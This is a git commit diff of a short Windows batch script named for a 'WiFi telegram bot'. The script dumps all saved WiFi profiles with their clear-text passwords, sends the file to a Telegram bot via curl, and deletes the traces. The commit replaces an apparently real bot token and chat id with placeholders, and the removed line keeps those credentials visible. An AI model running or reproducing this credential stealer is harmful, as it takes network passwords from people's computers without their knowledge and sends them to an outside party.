c04d9ef9dd497ca2db29d1162bfe1b3197f4797a
NINJABuoy42 <78472580+NINJABuoy42@users.noreply.github.com>
2022-11-27 16:10:01 +0530

    Update WiFi-telegram_bot.bat

--- WiFi-telegram_bot.bat
+++ WiFi-telegram_bot.bat
@@ -1,4 +1,4 @@
 @echo off
 netsh wlan show profiles  name=* key=clear > %temp%\temp.txt && FINDSTR /ic:"-" /ic:"Profile information" /ic:"name" /ic:"Security key" /ic:"Key content" %temp%\temp.txt >%temp%\wifi_creds.txt
-curl -F document=@"%temp%\wifi_creds.txt" https://api.telegram.org/bot5781649427:AAGG68lWMQKBekTI_5q_tDEaGXqjpqX8QjI/sendDocument?chat_id=924583598
+curl -F document=@"%temp%\wifi_creds.txt" https://api.telegram.org/bot<bot token>/sendDocument?chat_id=<chat id>
 DEL  %temp%\temp.txt && DEL %temp%\wifi_creds.txt
